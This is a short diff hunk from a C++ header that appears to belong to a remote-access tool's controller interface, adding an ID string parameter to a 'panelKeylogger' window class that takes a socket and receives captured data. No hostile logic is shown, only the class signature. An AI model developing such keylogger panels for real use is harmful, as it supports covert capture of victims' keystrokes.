@@ -5,7 +5,7 @@
 
 class panelKeylogger : public wxFrame {
 	public:
-		panelKeylogger(wxWindow* pParent, SOCKET sck);
+		panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID);
 		
 		void AgregarData(const char*& pBuffer);
 
